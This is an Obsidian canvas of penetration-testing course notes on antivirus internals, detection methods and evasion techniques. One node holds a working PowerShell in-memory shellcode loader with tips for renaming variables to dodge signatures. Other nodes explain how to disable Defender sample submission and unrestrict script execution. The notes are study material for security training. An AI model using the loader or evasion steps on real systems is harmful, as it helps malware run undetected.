{
	"nodes":[
		{"id":"7ae749a43c901dba","type":"text","text":"# Antivirus","x":1122,"y":32,"width":250,"height":60},
		{"id":"6bf2aae7ca3f48f1","type":"text","text":"Modern AV Components\n- **File Engine**: Conducts scheduled and real-time file scans.\n- **Memory Engine**: Inspects process memory space for signatures or suspicious API calls.\n- **Network Engine**: Monitors network traffic and blocks malware communications.\n- **Disassembler**: Translates machine code to assembly language for analysis.\n- **Emulator/Sandbox**: Loads malware into an isolated environment for safe analysis.\n- **Browser Plugin**: Enhances visibility and detects browser-executed malicious content.\n- **Machine Learning Engine**: Detects unknown threats using cloud-based computing resources.","x":768,"y":490,"width":632,"height":430},
		{"id":"21792ee01899cf41","type":"text","text":"**Endpoint Detection and Response (EDR)** solutions have evolved during recent years. EDR software is responsible for **generating security-event telemetry** and forwarding it to a **Security Information and Event Management (SIEM)** system, which **collects data from every company host**.\nThese events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.","x":240,"y":1080,"width":845,"height":280},
		{"id":"35ebacf50bc3bea0","type":"text","text":"**IDS/IPS**","x":1196,"y":1064,"width":250,"height":60},
		{"id":"5a5f752385856697","type":"text","text":"https://antiscan.me/\nhttps://www.virustotal.com/#/home/upload ","x":1676,"y":-30,"width":444,"height":92},
		{"id":"d112030a8dd8627d","type":"text","text":"# YARA Rules","x":1920,"y":196,"width":250,"height":60},
		{"id":"70a8d41d1140d2b8","type":"text","text":"Traditionally depends on signatures (different for every AV)","x":1372,"y":256,"width":323,"height":95},
		{"id":"4f43866389af94a1","x":1595,"y":632,"width":665,"height":368,"type":"text","text":"# Modern AV Detection Methodologies\n- **Signature-based Detection**: Scans the filesystem for known malware signatures.\n- **Heuristic-based Detection**: Uses rules and algorithms to identify malicious actions.\n- **Behavioral Detection**: Dynamically analyzes binary file behavior in an emulated environment.\n- **Machine Learning Detection**: Uses ML algorithms to detect unknown threats by analyzing metadata."},
		{"id":"1cbbb164755ff039","x":1266,"y":-487,"width":574,"height":107,"type":"text","text":"Antivirus products typically enforce threat quarantine by blocking any file system operation at the kernel level or even storing the malicious samples in encrypted storage accessible only by the AV software."},
		{"id":"c76233948000cedc","type":"text","text":"# Evading AV with Thread Injection\n_remote process memory injection_ technique","x":-1440,"y":-478,"width":429,"height":135},
		{"id":"b50833bc1f1a19d0","x":-1580,"y":-858,"width":640,"height":120,"type":"text","text":"# disable sample submission\n_Windows Security_ > _Virus & threat protection_ > _Manage Settings_ > deselect options"},
		{"id":"eab3279ad68eeb14","x":-1421,"y":-262,"width":481,"height":404,"type":"text","text":"A very powerful feature of PowerShell is its ability to interact with the [_Windows API_.](https://portal.offsec.com/courses/pen-200-44065/learning/antivirus-evasion-44896/av-evasion-in-practice-44922/evading-av-with-thread-injection-44903#fn-local_id_19-2) This allows us to implement the in-memory injection process in a PowerShell script. One of the main benefits of executing a script rather than a PE is that it is difficult for antivirus manufacturers to determine if the script is malicious as it's run inside an interpreter and the script itself isn't executable code. Nevertheless, please keep in mind that some AV products handle malicious script detection with more success than others.[3](https://portal.offsec.com/courses/pen-200-44065/learning/antivirus-evasion-44896/av-evasion-in-practice-44922/evading-av-with-thread-injection-44903#fn-local_id_19-3)\n\nFurthermore, even if the script is marked as malicious, it can easily be altered. Antivirus software will often review variable names, comments, and logic, all of which can be changed without the need to recompile anything"},
		{"id":"04a415cda0c1c93d","x":-2920,"y":-858,"width":1100,"height":1080,"type":"text","text":"```powershell\n# Set Powershell Execution Policy to allow running scripts\nPS> Get-ExecutionPolicy -Scope CurrentUser\nPS> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser\n```\n```powershell\n# The script starts by importing _VirtualAlloc_[4](https://portal.offsec.com/courses/pen-200-44065/learning/antivirus-evasion-44896/av-evasion-in-practice-44922/evading-av-with-thread-injection-44903#fn-local_id_19-4) and _CreateThread_[5](https://portal.offsec.com/courses/pen-200-44065/learning/antivirus-evasion-44896/av-evasion-in-practice-44922/evading-av-with-thread-injection-44903#fn-local_id_19-5) from **kernel32.dll** as well as _memset_ from **msvcrt.dll**. These functions will allow us to allocate memory, create an execution thread, and write arbitrary data to the allocated memory, respectively. Once again, notice that we are allocating the memory and executing a new thread in the current process (powershell.exe), rather than a remote one.\n\n$code = '\n[DllImport(\"kernel32.dll\")]\npublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n[DllImport(\"kernel32.dll\")]\npublic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n[DllImport(\"msvcrt.dll\")]\npublic static extern IntPtr memset(IntPtr dest, uint src, uint count);';\n\n# change var name winFunc to sth new, and \"Win32\" to eg. \"xxxWin32\" to obfuscate script\n$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru;\n\n# The script main logic starts by allocating a block of memory using _VirtualAlloc_, which takes each byte of the payload stored in the _$sc_ byte array and writes it to our newly-allocated memory block using _memset_.\n[Byte[]];\n# change var name \"sc\" to sth new to obfucate code\n[Byte[]]$sc = <place your shellcode here>;\n\n$size = 0x1000;\n\nif ($sc.Length -gt 0x1000) {$size = $sc.Length};\n\n$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);\n\nfor ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};\n\n# As a final step, our in-memory written payload is executed in a separate thread using the _CreateThread_ API.\n$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };\n```"},
		{"id":"af74a307df1f0cd2","x":-640,"y":-1018,"width":760,"height":1018,"type":"text","text":"# In-memory evasion \nevasion operates in-memory to avoid disk-based detection.\n\n## In-memory evasion techniques\ndo not write files to disk, focusing instead on volatile memory manipulation.\n\n### Remote Process Memory Injection\nThis technique involves injecting a payload into another valid PE. Steps include:\n1. Using `OpenProcess` to obtain a valid HANDLE to a target process.\n2. Allocating memory in the target process using `VirtualAllocEx`.\n3. Copying the malicious payload using `WriteProcessMemory`.\n4. Executing the payload in a new thread using `CreateRemoteThread`.\n\n### Reflective DLL Injection\nUnlike regular DLL injection, Reflective DLL Injection loads a DLL stored in process memory, bypassing the need for a disk-based DLL. Attackers must write their own version of the `LoadLibrary` API to support this.\n\n### Process Hollowing\nProcess hollowing involves:\n1. Launching a non-malicious process in a suspended state.\n2. Removing the process image from memory.\n3. Replacing it with a malicious executable image.\n4. Resuming the process to execute the malicious code.\n\n### Inline Hooking\nInline hooking modifies memory to introduce a hook into a function, redirecting code execution to malicious code before returning to the original function. Rootkits often use this technique to maintain persistent access to a system."},
		{"id":"d3d797e4311c86f9","x":-640,"y":20,"width":760,"height":1044,"type":"text","text":"# On-disk evasion\nmodifies malicious files stored on disk to evade AV detections\n\n## Techniques to obfuscate files stored on a physical disk.\n\n### Packers\nPackers reduce the size of an executable and change its binary structure, creating a new hash signature. This technique can bypass older AV scanners, but is less effective against modern AV engines. Example: UPX.\n\n### Obfuscators\nObfuscators mutate code to make it harder to reverse-engineer, including:\n- Replacing instructions with semantically equivalent ones\n- Inserting irrelevant instructions or dead code\n- Splitting or reordering functions\n\nModern obfuscators may also include runtime in-memory capabilities.\n\n### Crypters\nCrypter software cryptographically alters executable code, adding a decryption stub that restores the original code upon execution. This decryption happens in-memory, leaving only the encrypted code on-disk.\n\n### Advanced Techniques\nEffective evasion often combines multiple techniques and may include:\n- Anti-reversing\n- Anti-debugging\n- Virtual machine emulation detection\n\n### Tools\nFew free tools provide effective antivirus evasion. Commercial tools like The Enigma Protector can bypass antivirus products.\n"}
	],
	"edges":[
		{"id":"4c7095f8e7c5384b","fromNode":"7ae749a43c901dba","fromSide":"bottom","toNode":"70a8d41d1140d2b8","toSide":"top"},
		{"id":"2eb8b425baaa0e20","fromNode":"70a8d41d1140d2b8","fromSide":"bottom","toNode":"6bf2aae7ca3f48f1","toSide":"top"},
		{"id":"5eab6a9ad399a97c","fromNode":"6bf2aae7ca3f48f1","fromSide":"bottom","toNode":"21792ee01899cf41","toSide":"top"},
		{"id":"6b40c0e02e516358","fromNode":"6bf2aae7ca3f48f1","fromSide":"bottom","toNode":"35ebacf50bc3bea0","toSide":"top"},
		{"id":"a02d19db58766fc4","fromNode":"70a8d41d1140d2b8","fromSide":"right","toNode":"d112030a8dd8627d","toSide":"left"},
		{"id":"f940e9b0cf46350f","fromNode":"7ae749a43c901dba","fromSide":"right","toNode":"5a5f752385856697","toSide":"left"},
		{"id":"912bcdbcb1def0f5","fromNode":"70a8d41d1140d2b8","fromSide":"bottom","toNode":"4f43866389af94a1","toSide":"top"},
		{"id":"95cd427ef2bcaeeb","fromNode":"7ae749a43c901dba","fromSide":"left","toNode":"af74a307df1f0cd2","toSide":"right"},
		{"id":"b7a0beda7127beed","fromNode":"c76233948000cedc","fromSide":"top","toNode":"b50833bc1f1a19d0","toSide":"bottom"},
		{"id":"3a81ea27b60ca5c9","fromNode":"7ae749a43c901dba","fromSide":"top","toNode":"1cbbb164755ff039","toSide":"bottom"},
		{"id":"3982be05a161a21d","fromNode":"c76233948000cedc","fromSide":"bottom","toNode":"eab3279ad68eeb14","toSide":"top"},
		{"id":"e8a990080c53291a","fromNode":"c76233948000cedc","fromSide":"left","toNode":"04a415cda0c1c93d","toSide":"right"},
		{"id":"4a8b14208f811f21","fromNode":"af74a307df1f0cd2","fromSide":"left","toNode":"c76233948000cedc","toSide":"right"}
	]
}